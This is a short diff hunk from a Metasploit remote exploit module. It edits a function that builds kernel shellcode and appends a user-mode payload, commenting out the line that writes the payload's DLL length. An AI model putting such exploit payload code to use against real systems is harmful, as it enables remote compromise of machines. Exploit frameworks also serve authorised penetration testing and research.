@@ -403,7 +403,8 @@ class MetasploitModule < Msf::Exploit::Remote
   def make_kernel_user_payload(ring3)
     sc = make_kernel_shellcode()
 
-    sc << [ring3.length].pack('S<')
+	# no need for DLL length in the shellcode
+    ##sc << [ring3.length].pack('S<')
     sc << ring3
 
     sc
